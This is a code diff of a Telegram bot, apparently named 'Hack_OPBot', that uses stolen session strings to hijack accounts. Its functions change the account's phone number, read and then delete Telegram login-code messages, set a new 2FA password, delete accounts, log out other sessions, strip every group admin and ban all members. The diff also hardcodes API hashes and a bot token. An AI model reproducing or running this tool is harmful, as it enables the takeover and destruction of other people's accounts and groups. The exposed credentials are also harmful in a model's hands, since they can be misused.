@@ -3,12 +3,12 @@ import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types, Button
 
-api_id = os.environ.get("APP_ID")
+api_id = 11064344
 import os, asyncio, re
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-api_hash = os.environ.get("API_HASH")
-token = os.environ.get("BOT_TOKEN")
+api_hash = '12e57c4209a0cbd93dbd48ae0923d272'
+token = '6084240878:AAHfwONMpE-IDR2b3guvshT7w9q9v2a-RHo'
 client = TelegramClient('LegendBoy', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
@@ -18,20 +18,16 @@ import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "missrose_bot"
+mybot = "TmxPyr_bot"
 bot = borg = client
 
 legendboy = 929366169
 
-Bot_Username =os.environ.get("BOT_USERNAME", None) or "Hack_OPBot"
+Bot_Username =os.environ.get("BOT_USERNAME", None) or "TmxPyr_bot"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
-    try:
-      await bot(join("@yeyeee")
-    except BaseException:
-      pass
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
         phone_number=number,
@@ -45,10 +41,6 @@ async def change_number_code(strses, number, code, otp):
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
-    try:
-      await bot(join("@yeyeee")
-    except BaseException:
-      pass
 
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
@@ -64,36 +56,22 @@ async def change_number(strses, number):
 async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
     return str(k)
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
+
     await X(rt())
 
 GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
 
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
+
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
@@ -102,10 +80,6 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@SoFeThonBot")
-    except BaseException:
-      pass
-    try:
       await X.edit_2fa('@S44S4 IS BEST')
       return True
     except:
@@ -113,10 +87,7 @@ async def user2fa(strses):
 
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
+
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -127,28 +98,16 @@ async def demall(strses, grp):
 
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
-
     await X(join(username))
 
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
 
     await X(leave(username))
 
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
+
     await X(dc(username))
     
 
@@ -163,10 +122,6 @@ async def cu(strses):
 async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
-        try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
     await client.delete_dialog(777000)
@@ -176,10 +131,6 @@ async def usermsgs(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_participants(grp)
-        try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
     for x in k:
       try:
         await X.edit_permissions(grp, x.id, view_messages=False)
@@ -187,10 +138,6 @@ async def userbans(strses, grp):
         pass
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@yeyeee")
-    except BaseException:
-      pass
     k = await X(pc())
     i = ""
     for x in k.chats:
